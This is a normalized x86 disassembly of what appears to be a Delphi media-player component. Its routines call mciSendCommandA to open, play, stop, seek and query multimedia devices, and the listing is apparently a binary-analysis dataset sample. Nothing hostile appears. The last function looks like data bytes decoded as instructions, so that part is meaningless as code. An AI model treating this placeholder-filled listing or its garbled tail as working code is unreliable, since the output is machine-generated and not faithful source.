add edx edx
cmp [ edi + edx * 8 + 0x210 ] 0x0
je r-xdata
mov [ edi + 0x2e0 ] al
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
pop edi
pop esi
retn
cmp al 0x8
jae r-xdata
sub_469ab8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x31c ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
dec eax
je r-xdata
mov eax ebx
call sub_46ada0
cmp al 0x1
jne r-xdata
mov [ ebx + 0x308 ] 0x0
jmp r-xdata
dec eax
je r-xdata
cmp [ ebx + 0x2e3 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffb0
call sub_40346c
pop esi
pop ebx
retn
mov [ ebx + 0x308 ] 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
cmp [ ebx + 0x2e6 ] 0x0
je r-xdata
or [ ebx + 0x2a6 ] 0x1
mov [ ebx + 0x308 ] 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x2a6 ]
mov [ ebx + 0x2a6 ] ax
mov eax ebx
call sub_468f9c
or [ ebx + 0x2a6 ] 0x80
mov [ ebx + 0x308 ] 0x3
jmp r-xdata
sub_469c68
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_469ec6
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x14 ]
xor ecx ecx
mov edx 0x14
call sub_402c84
cmp [ ebx + 0x2e1 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov al [ ebx + 0x2f4 ]
mov eax [ eax * 4 + rw-data ]
mov [ ebp - 0xc ] eax
mov eax [ ebx + 0x318 ]
call sub_4044a8
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebx + 0x2e8 ] eax
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov eax ebx
call sub_469edc
mov [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2ec ] 0x0
je r-xdata
cmp [ ebx + 0x2f4 ] 0x0
je r-xdata
cmp [ ebx + 0x2ed ] 0x0
je r-xdata
mov [ ebx + 0x2ee ] 0x0
jmp r-xdata
mov [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2f4 ] 0x0
je r-xdata
or [ ebx + 0x2e8 ] 0x2000
mov [ ebx + 0x2ef ] 0x0
or [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
or [ ebx + 0x2e8 ] 0x200
or [ ebx + 0x2e8 ] 0x2000
jmp r-xdata
mov eax ebx
call sub_44d054
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x803
push 0x0
call mciSendCommandA
mov esi eax
mov [ ebx + 0x304 ] esi
test esi esi
je r-xdata
or [ ebx + 0x2e8 ] 0x100
cmp [ ebx + 0x31f ] 0x0
je r-xdata
mov [ ebx + 0x2e1 ] 0x1
mov ax [ ebp - 0x10 ]
mov [ ebx + 0x2f2 ] ax
mov eax ebx
call sub_46ad10
mov ecx 0xa
cdq
idiv ecx
mov [ ebx + 0x300 ] eax
mov eax ebx
call sub_46ab7c
cmp [ ebx + 0x2e7 ] 0x0
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_46ae6c
mov ecx [ ebp - 0x28 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_403a24
jmp r-xdata
mov al [ ebx + 0x2f4 ]
cmp al 0x2
je r-xdata
mov edx [ ebx + 0x30c ]
mov eax ebx
call sub_46aa14
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_46ab28
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
mov [ ebx + 0x310 ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
mov [ ebx + 0x314 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469ecd
lea eax [ ebp - 0x28 ]
call sub_403fe8
retn
mov dl 0xa
mov eax ebx
call sub_46a9d8
cmp al 0xb
jne r-xdata
cmp [ ebx + 0x2e3 ] 0x0
je r-xdata
mov ax [ r-xdata ]
or ax [ ebx + 0x2a6 ]
mov [ ebx + 0x2a6 ] ax
mov ax [ r-xdata ]
mov [ ebx + 0x2a6 ] ax
cmp [ ebx + 0x2e4 ] 0x0
je r-xdata
cmp [ ebx + 0x2e6 ] 0x0
je r-xdata
or [ ebx + 0x2a6 ] 0x1
cmp [ ebx + 0x2e5 ] 0x0
je r-xdata
or [ ebx + 0x2a6 ] 0x80
mov eax ebx
call sub_46ada0
cmp al 0x2
jne r-xdata
or [ ebx + 0x2a6 ] 0x100
mov eax ebx
call sub_468f9c
xor edx edx
mov eax ebx
mov si 0xffb3
call sub_40346c
sub_469edc
push ebx
push esi
push ecx
mov ebx eax
cmp [ ebx + 0x2f2 ] 0x0
je r-xdata
pop edx
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x2e8 ] eax
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2ec ] 0x0
je r-xdata
mov eax ebx
call sub_44d054
mov [ esp ] eax
mov eax esp
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x804
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov esi eax
mov [ ebx + 0x304 ] esi
test esi esi
jne r-xdata
cmp [ ebx + 0x2ed ] 0x0
je r-xdata
mov [ ebx + 0x2ee ] 0x0
jmp r-xdata
mov [ ebx + 0x2e8 ] 0x2
mov [ ebx + 0x2e1 ] 0x0
mov [ ebx + 0x2f2 ] 0x0
mov ax [ r-xdata ]
mov [ ebx + 0x2a6 ] ax
mov eax ebx
call sub_468f9c
mov [ ebx + 0x2ef ] 0x0
or [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
sub_469fa4
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_469b5c
cmp [ ebx + 0x31e ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x2e8 ] eax
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
mov eax ebx
call sub_46ade4
mov esi eax
mov eax ebx
call sub_46ad10
cmp esi eax
jne r-xdata
mov [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2ed ] 0x0
je r-xdata
cmp [ ebx + 0x2f0 ] 0x0
jne r-xdata
cmp [ ebx + 0x2f0 ] 0x0
je r-xdata
cmp [ ebx + 0x2ec ] 0x0
je r-xdata
mov [ ebx + 0x2ef ] 0x0
jmp r-xdata
mov [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2f1 ] 0x0
jne r-xdata
cmp [ ebx + 0x2f1 ] 0x0
je r-xdata
or [ ebx + 0x2e8 ] 0x4
mov eax [ ebx + 0x2fc ]
mov [ esp + 0x4 ] eax
mov [ ebx + 0x2f0 ] 0x0
mov [ ebx + 0x2ee ] 0x0
or [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov eax ebx
call sub_46a94c
mov eax ebx
call sub_44d054
mov [ esp ] eax
mov eax esp
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x806
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
add esp 0xc
pop esi
pop ebx
retn
or [ ebx + 0x2e8 ] 0x8
mov eax [ ebx + 0x2f8 ]
mov [ esp + 0x8 ] eax
mov [ ebx + 0x2f1 ] 0x0
sub_46a0b4
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_469b5c
xor eax eax
mov [ ebx + 0x2e8 ] eax
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
mov [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2ed ] 0x0
je r-xdata
cmp [ ebx + 0x2f0 ] 0x0
je r-xdata
cmp [ ebx + 0x2ec ] 0x0
je r-xdata
mov [ ebx + 0x2ef ] 0x0
jmp r-xdata
mov [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2f1 ] 0x0
je r-xdata
or [ ebx + 0x2e8 ] 0x4
mov eax [ ebx + 0x2fc ]
mov [ esp + 0x4 ] eax
mov [ ebx + 0x2f0 ] 0x0
mov [ ebx + 0x2ee ] 0x0
or [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov eax ebx
call sub_44d054
mov [ esp ] eax
mov eax esp
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x80f
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
add esp 0xc
pop ebx
retn
or [ ebx + 0x2e8 ] 0x8
mov eax [ ebx + 0x2f8 ]
mov [ esp + 0x8 ] eax
mov [ ebx + 0x2f1 ] 0x0
sub_46a18c
push ebx
push ecx
mov ebx eax
mov eax ebx
call sub_469b5c
xor eax eax
mov [ ebx + 0x2e8 ] eax
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2ec ] 0x0
je r-xdata
mov eax ebx
call sub_44d054
mov [ esp ] eax
mov eax esp
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x808
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
pop edx
pop ebx
retn
cmp [ ebx + 0x2ed ] 0x0
je r-xdata
mov [ ebx + 0x2ee ] 0x0
jmp r-xdata
mov [ ebx + 0x2e8 ] 0x2
mov [ ebx + 0x2ef ] 0x0
or [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
sub_46a220
push ebx
mov ebx eax
cmp [ ebx + 0x2e1 ] 0x0
jne r-xdata
mov eax ebx
call sub_46ada0
cmp al 0x2
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
mov eax ebx
call sub_46ada0
cmp al 0x5
jne r-xdata
mov eax ebx
call sub_46a26c
pop ebx
retn
pop ebx
retn
mov eax ebx
call sub_46a300
sub_46a26c
push ebx
push ecx
mov ebx eax
mov eax ebx
call sub_469b5c
xor eax eax
mov [ ebx + 0x2e8 ] eax
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2ec ] 0x0
je r-xdata
mov eax ebx
call sub_44d054
mov [ esp ] eax
mov eax esp
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x809
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
pop edx
pop ebx
retn
cmp [ ebx + 0x2ed ] 0x0
je r-xdata
mov [ ebx + 0x2ee ] 0x0
jmp r-xdata
mov [ ebx + 0x2e8 ] 0x2
mov [ ebx + 0x2ef ] 0x0
or [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
sub_46a300
push ebx
push esi
push ecx
mov ebx eax
mov eax ebx
call sub_469b5c
xor eax eax
mov [ ebx + 0x2e8 ] eax
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
mov [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2ed ] 0x0
je r-xdata
mov eax ebx
call sub_44d054
mov [ esp ] eax
mov eax esp
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x855
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov esi eax
mov [ ebx + 0x304 ] esi
test esi esi
je r-xdata
cmp [ ebx + 0x2ec ] 0x0
je r-xdata
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov [ ebx + 0x2e8 ] 0x1
jmp r-xdata
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
mov eax ebx
call sub_469fa4
jmp r-xdata
or [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov [ ebx + 0x2ef ] 0x0
pop edx
pop esi
pop ebx
retn
mov [ ebx + 0x2ee ] 0x0
sub_46a3b4
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_469b5c
xor eax eax
mov [ ebx + 0x2e8 ] eax
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2ec ] 0x0
je r-xdata
mov esi [ ebx + 0x2e8 ]
mov eax ebx
call sub_46ae24
cmp al 0xa
jne r-xdata
cmp [ ebx + 0x2ed ] 0x0
je r-xdata
mov [ ebx + 0x2ee ] 0x0
jmp r-xdata
mov [ ebx + 0x2e8 ] 0x2
or esi 0x200
mov [ ebx + 0x2e8 ] esi
mov eax ebx
call sub_46ada0
cmp al 0x2
jne r-xdata
mov [ ebx + 0x2ef ] 0x0
or [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
mov eax ebx
call sub_46ade4
call sub_468410
mov edi eax
and edi 0xff
mov eax ebx
call sub_46ad58
cmp edi eax
jne r-xdata
mov eax ebx
call sub_46ade4
call sub_468410
mov esi eax
and esi 0xff
mov eax ebx
call sub_46ad58
cmp esi eax
jne r-xdata
mov eax ebx
call sub_46ade4
call sub_468410
xor edx edx
mov dl al
inc edx
mov eax ebx
call sub_46a978
mov [ esp + 0x4 ] eax
mov eax ebx
call sub_46ad58
mov edx eax
mov eax ebx
call sub_46a978
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_46ade4
call sub_468410
xor edx edx
mov dl al
inc edx
mov eax ebx
call sub_46a978
mov edx eax
mov eax ebx
call sub_46a9b0
mov eax ebx
call sub_46ad58
mov edx eax
mov eax ebx
call sub_46a978
mov edx eax
mov eax ebx
call sub_46a9b0
jmp r-xdata
mov eax ebx
call sub_44d054
mov [ esp ] eax
mov eax esp
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x807
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
or esi 0x8
mov [ ebx + 0x2e8 ] esi
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_469fa4
mov [ ebx + 0x2aa ] 0x0
jmp r-xdata
sub_46a544
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_469b5c
xor eax eax
mov [ ebx + 0x2e8 ] eax
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2ec ] 0x0
je r-xdata
mov ebp [ ebx + 0x2e8 ]
mov eax ebx
call sub_46ae24
cmp al 0xa
jne r-xdata
cmp [ ebx + 0x2ed ] 0x0
je r-xdata
mov [ ebx + 0x2ee ] 0x0
jmp r-xdata
mov [ ebx + 0x2e8 ] 0x2
or ebp 0x100
mov [ ebx + 0x2e8 ] ebp
mov eax ebx
call sub_46ade4
mov esi eax
mov eax ebx
call sub_46ade4
call sub_468410
xor edx edx
mov dl al
mov eax ebx
call sub_46a978
mov edi eax
mov eax ebx
call sub_46ada0
cmp al 0x2
jne r-xdata
mov [ ebx + 0x2ef ] 0x0
or [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
mov eax esi
call sub_468410
cmp al 0x1
je r-xdata
mov eax esi
call sub_468410
cmp al 0x1
je r-xdata
mov [ esp + 0x4 ] edi
mov eax esi
call sub_468414
push eax
mov eax edi
call sub_468414
pop edx
cmp dl al
jne r-xdata
mov edx edi
mov eax ebx
call sub_46a9b0
mov eax esi
call sub_468414
push eax
mov eax edi
call sub_468414
pop edx
cmp dl al
jne r-xdata
mov eax ebx
call sub_44d054
mov [ esp ] eax
mov eax esp
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x807
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
mov eax esi
call sub_46841c
push eax
mov eax edi
call sub_46841c
pop edx
cmp dl al
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_46841c
push eax
mov eax edi
call sub_46841c
pop edx
cmp dl al
jne r-xdata
mov eax ebx
call sub_46ade4
call sub_468410
xor edx edx
mov dl al
dec edx
mov eax ebx
call sub_46a978
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_46ade4
call sub_468410
xor edx edx
mov dl al
dec edx
mov eax ebx
call sub_46a978
mov edx eax
mov eax ebx
call sub_46a9b0
jmp r-xdata
or ebp 0x8
mov [ ebx + 0x2e8 ] ebp
jmp r-xdata
mov eax ebx
call sub_469fa4
mov [ ebx + 0x2aa ] 0x0
jmp r-xdata
sub_46a700
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_469b5c
cmp [ ebx + 0x2e7 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x31e ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x2e8 ] eax
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov eax ebx
call sub_46ade4
mov esi eax
mov eax ebx
call sub_46ad10
cmp esi eax
jne r-xdata
mov [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2ec ] 0x0
je r-xdata
mov eax ebx
call sub_46a94c
or [ ebx + 0x2e8 ] 0x20000
mov eax [ ebx + 0x300 ]
mov [ esp + 0x4 ] eax
mov eax ebx
call sub_44d054
mov [ esp ] eax
mov eax esp
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x80e
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
cmp [ ebx + 0x2ed ] 0x0
je r-xdata
mov [ ebx + 0x2ee ] 0x0
jmp r-xdata
mov [ ebx + 0x2e8 ] 0x2
mov [ ebx + 0x2ef ] 0x0
or [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
sub_46a7dc
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_469b5c
cmp [ ebx + 0x2e7 ] 0x0
je r-xdata
pop ecx
pop edx
pop ebx
retn
xor eax eax
mov [ ebx + 0x2e8 ] eax
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2ec ] 0x0
je r-xdata
mov eax [ ebx + 0x2e8 ]
or eax 0x20000
or eax 0x10000
mov [ ebx + 0x2e8 ] eax
mov eax [ ebx + 0x300 ]
mov [ esp + 0x4 ] eax
mov eax ebx
call sub_44d054
mov [ esp ] eax
mov eax esp
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x80e
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
cmp [ ebx + 0x2ed ] 0x0
je r-xdata
mov [ ebx + 0x2ee ] 0x0
jmp r-xdata
mov [ ebx + 0x2e8 ] 0x2
mov [ ebx + 0x2ef ] 0x0
or [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
sub_46a8a0
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_469b5c
cmp [ ebx + 0x2e5 ] 0x0
je r-xdata
add esp 0xc
pop ebx
retn
xor eax eax
mov [ ebx + 0x2e8 ] eax
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2ec ] 0x0
je r-xdata
or [ ebx + 0x2e8 ] 0x100
mov eax ebx
call sub_44d054
mov [ esp ] eax
mov eax esp
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x80d
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
cmp [ ebx + 0x2ed ] 0x0
je r-xdata
mov [ ebx + 0x2ee ] 0x0
jmp r-xdata
mov [ ebx + 0x2e8 ] 0x2
mov [ ebx + 0x2ef ] 0x0
or [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
sub_46a94c
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_469b5c
mov eax 0x102
mov edx esp
push edx
push eax
push 0x807
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
pop ecx
pop edx
pop ebx
retn
sub_46a978
add esp 0xfffffff0
mov ecx 0x112
mov [ eax + 0x2e8 ] ecx
mov [ esp + 0x8 ] 0x2
mov [ esp + 0xc ] edx
mov edx esp
push edx
push ecx
push 0x814
movzx eax [ eax + 0x2f2 ]
push eax
call mciSendCommandA
mov eax [ esp + 0x4 ]
add esp 0x10
retn
sub_46a9d8
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov esi 0x401
mov [ ebx + 0x2e8 ] esi
xor eax eax
mov al dl
mov [ esp + 0x4 ] eax
mov eax esp
push eax
push esi
push 0x80d
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
add esp 0xc
pop esi
pop ebx
retn
sub_46aa14
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov [ ebx + 0x30c ] esi
cmp [ ebx + 0x2e1 ] 0x0
je r-xdata
cmp [ ebx + 0x2e7 ] 0x0
je r-xdata
mov [ ebx + 0x2e8 ] 0x10002
mov eax esi
call sub_44d054
mov [ esp + 0x4 ] eax
mov eax esp
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x841
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov edi eax
mov [ ebx + 0x304 ] edi
test edi edi
je r-xdata
mov [ ebx + 0x30c ] esi
mov edx ebx
mov eax esi
call sub_42093c
jmp r-xdata
xor eax eax
mov [ ebx + 0x30c ] eax
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_46aa9c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_445c34
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30c ]
jne r-xdata
cmp [ edi + 0x2e1 ] 0x0
je r-xdata
xor eax eax
mov [ edi + 0x30c ] eax
mov eax edi
call sub_46aadc
sub_46aadc
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
cmp [ ebx + 0x2e1 ] 0x0
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x2e7 ] 0x0
je r-xdata
mov esi 0x10002
mov [ ebx + 0x2e8 ] esi
xor eax eax
mov [ esp + 0x4 ] eax
mov eax esp
push eax
push esi
push 0x841
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
sub_46ab28
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov ebx eax
cmp [ ebx + 0x2e1 ] 0x0
je r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x2e7 ] 0x0
je r-xdata
mov esi 0x40000
mov [ ebx + 0x2e8 ] esi
mov eax esp
push eax
push esi
push 0x843
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub_46ab7c
push ebx
push esi
push edi
add esp 0xffffffd0
mov ebx eax
mov esi esp
mov eax 0x102
mov [ ebx + 0x2e8 ] eax
mov [ esi + 0x8 ] 0x8
push esi
push eax
push 0x80b
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov eax [ esi + 0x4 ]
mov [ ebx + 0x2e3 ] al
test al al
je r-xdata
mov [ esi + 0x8 ] 0x1
push esi
mov eax [ ebx + 0x2e8 ]
push eax
push 0x80b
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov eax [ esi + 0x4 ]
mov [ ebx + 0x2e6 ] al
test al al
je r-xdata
or [ ebx + 0x2e2 ] 0x4
mov [ esi + 0x8 ] 0x7
push esi
mov eax [ ebx + 0x2e8 ]
push eax
push 0x80b
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov eax [ esi + 0x4 ]
mov [ ebx + 0x2e5 ] al
test al al
je r-xdata
or [ ebx + 0x2e2 ] 0x8
mov [ esi + 0x8 ] 0x3
push esi
mov eax [ ebx + 0x2e8 ]
push eax
push 0x80b
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov eax [ esi + 0x4 ]
mov [ ebx + 0x2e7 ] al
test al al
je r-xdata
or [ ebx + 0x2e2 ] 0x2
mov [ esi + 0x8 ] 0x4
push esi
mov eax [ ebx + 0x2e8 ]
push eax
push 0x80b
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov eax [ esi + 0x4 ]
cmp eax 0x207
je r-xdata
or [ ebx + 0x2e2 ] 0x10
mov [ ebx + 0x2e4 ] 0x1
cmp eax 0x208
je r-xdata
mov esi 0x20000
mov [ ebx + 0x2e8 ] esi
lea eax [ esp + 0xc ]
push eax
push esi
push 0x843
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
lea esi [ esp + 0x10 ]
lea edi [ esp + 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ esp + 0x28 ]
sub eax [ esp + 0x20 ]
mov [ ebx + 0x310 ] eax
mov eax [ esp + 0x2c ]
sub eax [ esp + 0x24 ]
mov [ ebx + 0x314 ] eax
add esp 0x30
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x2e2 ] 0x1
cmp eax 0x203
je r-xdata
cmp eax 0x201
jne r-xdata
cmp [ ebx + 0x2e4 ] 0x0
je r-xdata
sub_46ad10
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_469b5c
mov esi 0x102
mov [ ebx + 0x2e8 ] esi
mov [ esp + 0x8 ] 0x1
mov eax esp
push eax
push esi
push 0x814
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
mov eax [ esp + 0x4 ]
add esp 0x10
pop esi
pop ebx
retn
sub_46ad58
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_469b5c
mov esi 0x102
mov [ ebx + 0x2e8 ] esi
mov [ esp + 0x8 ] 0x3
mov eax esp
push eax
push esi
push 0x814
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
mov eax [ esp + 0x4 ]
add esp 0x10
pop esi
pop ebx
retn
sub_46ada0
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi 0x102
mov [ ebx + 0x2e8 ] esi
mov [ esp + 0x8 ] 0x4
mov eax esp
push eax
push esi
push 0x814
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
mov al [ esp + 0x4 ]
sub al 0xc
add esp 0x10
pop esi
pop ebx
retn
sub_46ade4
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi 0x102
mov [ ebx + 0x2e8 ] esi
mov [ esp + 0x8 ] 0x2
mov eax esp
push eax
push esi
push 0x814
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
mov eax [ esp + 0x4 ]
add esp 0x10
pop esi
pop ebx
retn
sub_46ae24
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_469b5c
mov esi 0x102
mov [ ebx + 0x2e8 ] esi
mov [ esp + 0x8 ] 0x6
mov eax esp
push eax
push esi
push 0x814
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
mov al [ esp + 0x4 ]
add esp 0x10
pop esi
pop ebx
retn
sub_46ae6c
push ebx
push esi
add esp 0xfffff004
push eax
mov esi edx
mov ebx eax
push 0x1000
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x304 ]
push eax
call mciGetErrorStringA
test eax eax
jne r-xdata
mov eax esp
call sub_4086b4
mov ecx eax
mov edx esp
mov eax esi
call sub_4040d8
mov edx esi
mov eax [ rw-data ]
call sub_405d6c
jmp r-xdata
add esp 0x1000
pop esi
pop ebx
retn
sub_46aebc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46aee1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46aee8
retn
sub_46aef4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46af19
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46af20
retn
sub_46af2c
push 0xf80047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add cl bh
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add dl bh
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add bl bh
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_46af71
